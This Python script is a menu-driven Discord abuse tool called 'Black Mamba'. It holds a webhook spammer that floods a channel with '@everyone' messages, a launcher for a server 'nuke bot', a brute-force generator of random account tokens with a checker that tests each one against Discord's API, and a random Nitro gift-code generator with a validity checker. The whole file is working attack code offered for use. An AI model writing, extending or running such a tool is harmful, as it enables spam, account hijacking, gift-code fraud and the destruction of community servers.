import discord
from discord import Webhook
import colorama
import os
import aiohttp
import asyncio
import time
import subprocess
import random
import keyboard
import string
from random import randint
from requests import post
import requests


intents = discord.Intents.default()
intents.guilds = True
colorama.init()
FORE = colorama.Fore
RESET = colorama.Style.RESET_ALL
USER = os.getlogin()

sample_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890-_"

ascii_art = r"""
                ██████╗ ██╗      █████╗  ██████╗██╗  ██╗    ███╗   ███╗ █████╗ ███╗   ███╗██████╗  █████╗ 
                ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝    ████╗ ████║██╔══██╗████╗ ████║██╔══██╗██╔══██╗
                ██████╔╝██║     ███████║██║     █████╔╝     ██╔████╔██║███████║██╔████╔██║██████╔╝███████║
                ██╔══██╗██║     ██╔══██║██║     ██╔═██╗     ██║╚██╔╝██║██╔══██║██║╚██╔╝██║██╔══██╗██╔══██║
                ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗    ██║ ╚═╝ ██║██║  ██║██║ ╚═╝ ██║██████╔╝██║  ██║
                ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝


                    - ViperDev (https://github.com/TheOneViperCoder)                    Ver 1.0.0                               """

def variant2(token):
    response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
    if "You need to verify your account in order to perform this action." in str(response.content) or "401: Unauthorized" in str(response.content):
        return False
    else:
        return True

def main():
    os.system("CLS")
    print(FORE.MAGENTA, ascii_art)
    print(FORE.RED)
    choice=input(f"""\n                        ┌——————————————————————————————[Options:]————————————————————————————┐
                        │                                                                    │ 
                        │- [(1): Webhook spammer]    [(2): Nuke bot]    [(3): Token checker] │
                        │- [(4): Nitro Checker]        [(5): WIP]        [(6): WIP]          │
                        │- [(7): Brute force token gen]     [(8): Burte force Nitro gen]     │
                        │                                                                    │   
                        ├————————————————————————————————————————————————————————————————————┘
                        │   
                        │   Back: [B]                   Page 1                  Next: [N]
                        │
                        │                              Exit: [E]
                        │
                        │
                        ╰—{FORE.LIGHTYELLOW_EX}[{FORE.CYAN}{USER}{FORE.GREEN}@{FORE.LIGHTMAGENTA_EX}BlackMamba{FORE.LIGHTYELLOW_EX}]{FORE.RED}—▶ """)
    if choice == '1':
        os.system("CLS")
        print(FORE.CYAN)
        print(r"""
 __      __      ___.   .__                   __       _________                                          
/  \    /  \ ____\_ |__ |  |__   ____   ____ |  | __  /   _____/__________    _____   _____   ___________ 
\   \/\/   // __ \| __ \|  |  \ /  _ \ /  _ \|  |/ /  \_____  \\____ \__  \  /     \ /     \_/ __ \_  __ \
 \        /\  ___/| \_\ \   Y  (  <_> |  <_> )    <   /        \  |_> > __ \|  Y Y  \  Y Y  \  ___/|  | \/
  \__/\  /  \___  >___  /___|  /\____/ \____/|__|_ \ /_______  /   __(____  /__|_|  /__|_|  /\___  >__|   
       \/       \/    \/     \/                   \/         \/|__|       \/      \/      \/     \/       
                                                                                                                              
""")
        print(FORE.GREEN)
        webhk=input("  Insert Webhook URL: ")
        msgs=int(input("  Insert the desired messages number: "))
        speed=int(input("  Insert the desired speed to send the messages in milliseconds (more than 500 is recommended): "))
        async def mambaspam():
            async with aiohttp.ClientSession() as session:
                webhook = Webhook.from_url(webhk, session=session)

                for i in range(msgs):
                    await webhook.send(f'@everyone GET SPAMMED BY BLACK MAMBA LMAO', username='Black Mamba')
                    print(f"{i +1} Messages sent.")
                    await asyncio.sleep(speed / 1000)
        asyncio.run(mambaspam())
        time.sleep(1)
        main()

    elif choice=='2':
        try:
            os.system('CLS')
            subprocess.Popen(['python','bot.py'], creationflags=subprocess.CREATE_NEW_CONSOLE)
            print(r"""
____   ____.__                       _______         __                 
\   \ /   /|__|_____   ___________   \      \  __ __|  | __ ___________ 
 \   Y   / |  \____ \_/ __ \_  __ \  /   |   \|  |  \  |/ // __ \_  __ \
  \     /  |  |  |_> >  ___/|  | \/ /    |    \  |  /    <\  ___/|  | \/
   \___/   |__|   __/ \___  >__|    \____|__  /____/|__|_ \\___  >__|   
              |__|        \/                \/           \/    \/       
""")
            print(FORE.BLUE)
            input("The nuke bot has been launched, check the guide for the list of available commands. Press any key to continue.")
            main()

        except:
            print("Error executing the bot, verify that all the files are in the working directory and try again.")

    elif choice == "3":
        os.system("CLS")
        print(FORE.CYAN)
        print(r"""
___________     __                          .__                   __                 
\__    ___/___ |  | __ ____   ____     ____ |  |__   ____   ____ |  | __ ___________ 
  |    | /  _ \|  |/ // __ \ /    \  _/ ___\|  |  \_/ __ \_/ ___\|  |/ // __ \_  __ \
  |    |(  <_> )    <\  ___/|   |  \ \  \___|   Y  \  ___/\  \___|    <\  ___/|  | \/
  |____| \____/|__|_ \\___  >___|  /  \___  >___|  /\___  >\___  >__|_ \\___  >__|   
                    \/    \/     \/       \/     \/     \/     \/     \/    \/       
""")
        print(FORE.GREEN)
        input("Press any key to continue.")
        if __name__ == "__main__":
            try:
                checked = []
                with open('generated/tokens.txt', 'r') as tokens:
                    for token in tokens.read().split('\n'):
                        if len(token) > 15 and token not in checked and variant2(token) == True:
                            print(f'Token: {token} is Valid')
                            checked.append(token)
                        else:
                            print(f'Token: {token} is Invalid')
                if len(checked) > 0:
                    save = input(f'{len(checked)} valid tokens\nSave to File (y/n)').lower()
                    if save == 'y':
                        name = randint(100000000, 9999999999)
                        with open(f'{name}.txt', 'w') as saveFile:
                            saveFile.write('\n'.join(checked))
                        print(f'Tokens Save To {name}.txt File!')
                print("Press Enter To Exit...")
                keyboard.wait('ENTER')
                main()
            except:
                print("Can`t Open tokens.txt File!")
                time.sleep(3)
                main()

    elif choice== "4":
        os.system("CLS")
        print(FORE.CYAN)
        print(r"""
 _______  .__  __                         .__                   __                 
 \      \ |__|/  |________  ____     ____ |  |__   ____   ____ |  | __ ___________ 
 /   |   \|  \   __\_  __ \/  _ \  _/ ___\|  |  \_/ __ \_/ ___\|  |/ // __ \_  __ \
/    |    \  ||  |  |  | \(  <_> ) \  \___|   Y  \  ___/\  \___|    <\  ___/|  | \/
\____|__  /__||__|  |__|   \____/   \___  >___|  /\___  >\___  >__|_ \\___  >__|   
        \/                              \/     \/     \/     \/     \/    \/       
""")
        print(FORE.GREEN)
        input("Press any key to continue.")
        with open("generated/Nitro Codes.txt") as f:
            for line in f:
                nitro = line.strip("\n")

                url = "https://discordapp.com/api/v9/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

                r = requests.get(url)

                if r.status_code == 200:
                    print(" valid| {} ".format(line.strip("\n")))
                    break
                else:
                    print(" invalid | {} ".format(line.strip("\n")))
        input("Press 'Enter' to exit!")
        main()

    elif choice == "7":
        os.system("CLS")
        def gen():
            print(FORE.CYAN)
            print(r"""
___________     __                                          
\__    ___/___ |  | __ ____   ____      ____   ____   ____  
  |    | /  _ \|  |/ // __ \ /    \    / ___\_/ __ \ /    \ 
  |    |(  <_> )    <\  ___/|   |  \  / /_/  >  ___/|   |  \
  |____| \____/|__|_ \\___  >___|  /  \___  / \___  >___|  /
                    \/    \/     \/  /_____/      \/     \/                   
""")
            print(FORE.GREEN)
            num = input("How many tokens do you want to generate? ")
            for i in range(int(num)):
                first = ""
                second = ""
                third = ""

                for f in range(26):
                    first += random.choice(sample_chars)

                for s in range(6):
                    second += random.choice(f"{sample_chars}_")

                for t in range(29):
                    third += random.choice(sample_chars)


                token = f"MTM{first}.{second}.{third}"

                print("\nGenerating...")

                output = open("generated/tokens.txt", "a")
                output.write(f"{token}\n")
        gen()
        print ("")
        print("Tokens got saved on tokens.txt in the [generated] folder.")
        print("\nPress (ESC) to return to the main menu.")
        keyboard.wait('esc')
        main()

    elif choice=="8":
        os.system("CLS")
        print(FORE.CYAN)
        print(r"""
 _______  .__  __                                                             __                
 \      \ |__|/  |________  ____      ____   ____   ____   ________________ _/  |_  ___________ 
 /   |   \|  \   __\_  __ \/  _ \    / ___\_/ __ \ /    \_/ __ \_  __ \__  \\   __\/  _ \_  __ \
/    |    \  ||  |  |  | \(  <_> )  / /_/  >  ___/|   |  \  ___/|  | \// __ \|  | (  <_> )  | \/
\____|__  /__||__|  |__|   \____/   \___  / \___  >___|  /\___  >__|  (____  /__|  \____/|__|   
        \/                         /_____/      \/     \/     \/           \/                   


""")
        print(FORE.GREEN)
        num=input('How many gifts do you want to generate?: ')

        f=open("generated/Nitro Codes.txt","w", encoding='utf-8')
            
        for n in range(int(num)):
            y = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16))
            f.write('https://discord.gift/')
            f.write(y)
            f.write("\n")

        input("The codes can be found in generated/Nitro Codes.txt, check them to get any potential valid ones.\nPress any key to continue.")

        f.close()
        main()


    elif choice=="e":  
        exit()  

    elif choice=="E":
        exit()

    else:
        print("\nEither not an option or Work In Progress.")
        time.sleep(0.8)
        main()

main()